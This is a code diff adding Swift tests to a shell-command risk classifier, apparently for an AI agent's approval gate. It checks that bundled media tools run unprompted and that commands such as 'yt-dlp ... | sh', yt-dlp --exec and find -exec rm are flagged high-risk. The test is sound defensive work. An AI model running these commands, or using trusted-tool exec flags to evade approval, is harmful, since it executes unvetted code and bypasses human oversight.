@@ -43,6 +43,34 @@ struct ShellCommandClassifierTests {
     }
 
     @Test
+    func bundledCapabilityToolsRunWithoutAPrompt() {
+        // The motivating bug: clipping a YouTube video and burning in subtitles is the literal task —
+        // the bundled, signed media tools must not raise an Approve/Deny gate as "unrecognized command".
+        #expect(tier("yt-dlp --download-sections '*15:00-16:00' -f 'best[ext=mp4]' -o clip.mp4 'https://youtu.be/x'") == .read)
+        #expect(tier("ffmpeg -i clip.mp4 -vf \"subtitles=subs.srt\" -c:a copy out.mp4") == .read)
+        #expect(tier("ffprobe -v error -show_entries format=duration -of csv=p=0 out.mp4") == .read)
+        #expect(tier("qpdf --decrypt in.pdf out.pdf") == .read)
+        #expect(tier("exiftool -all= photo.jpg") == .read)
+        // A path-qualified invocation normalizes to the bare tool name and is still trusted.
+        #expect(tier("/opt/donkey-tools/yt-dlp -P ~/Downloads 'https://youtu.be/x'") == .read)
+        // But a dangerous wrapper around a bundled tool is still caught by the whole-command checks.
+        #expect(tier("yt-dlp -o - 'https://x' | sh") == .highRisk)
+    }
+
+    @Test
+    func commandExecutionFlagsAreHighRiskEvenOnTrustedTools() {
+        // yt-dlp's --exec runs an arbitrary command after download — it must never run silently, even
+        // though yt-dlp is otherwise a trusted bundled tool that runs read-tier. No `| sh` or separator
+        // here, so this exercises the flag gate specifically, not the whole-command substring check.
+        #expect(tier("yt-dlp --exec 'open -a Calculator' 'https://youtu.be/x'") == .highRisk)
+        #expect(tier("yt-dlp --exec-before-download 'touch /tmp/x' 'https://youtu.be/x'") == .highRisk)
+        // find runs read-tier, but -exec/-execdir turn it into a command runner — a latent escape hatch
+        // the gate also closes.
+        #expect(tier("find . -name '*.tmp' -exec rm {} ;") == .highRisk)
+        #expect(tier("find . -type d -execdir chmod 700 {} ;") == .highRisk)
+    }
+
+    @Test
     func readSubcommandsOfWriteCapableToolsAreRead() {
         #expect(tier("defaults read com.apple.dock") == .read)
         #expect(tier("pmset -g batt") == .read)
